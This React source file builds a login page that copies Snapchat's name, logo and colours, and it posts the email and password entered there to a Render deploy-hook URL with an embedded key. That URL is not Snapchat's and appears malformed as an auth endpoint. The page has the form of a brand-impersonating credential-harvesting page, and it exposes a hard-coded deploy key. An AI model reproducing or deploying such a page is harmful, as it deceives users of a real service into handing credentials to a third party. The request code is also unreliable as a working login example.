import React, { useState } from "react";
import axios from "axios";

import { Link } from "react-router-dom";


function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

 const handleLogin = async (e) => {
  e.preventDefault();
  try {
    const res = await axios.post("https://api.render.com/deploy/srv-d1oi0qvfte5s73bchhm0?key=3Jz-o7prxNM/api/auth/login", {
      email,
      password,
    });
    alert("Login successful!");
    localStorage.setItem("token", res.data.token);
  } catch (err) {
    setError(err.response?.data?.msg || "Login failed");
  }
};


  return (
    <div style={{ backgroundColor: '#FFFF00' }} className="min-h-screen flex items-center justify-center">

      <div className="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md">
        <div className="flex flex-col items-center mb-6">
          <img src="/logo.png" alt="Snapchat Logo" className="h-16 mb-2" />
          <div className="text-2xl font-bold text-black">Snapchat</div>
        </div>

        <form onSubmit={handleLogin}>
          <div className="mb-4">
            <label className="block text-sm font-semibold text-gray-700 mb-1">Email</label>
            <input
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-yellow-400"
            />
          </div>
          <div className="mb-4">
            <label className="block text-sm font-semibold text-gray-700 mb-1">Password</label>
            <input
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-yellow-400"
            />
          </div>

          {error && <p className="text-red-600 text-sm mb-3">{error}</p>}

          <button
            type="submit"
            className="w-full bg-yellow-400 text-black font-bold py-2 rounded-xl hover:bg-yellow-500 transition"
          >
            Log In
          </button>
          <p>
  Don't have an account? <Link to="/signup"><a href="#" className="text-blue-600 hover:underline">Sign Up</a></Link>
          </p>

                <div className="flex justify-between mt-4 text-sm">
            <p>
              <Link to="/forgot-password"><a href="#" className="text-blue-600 hover:underline">Forgot Password?</a></Link>
             </p>

            
           
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;

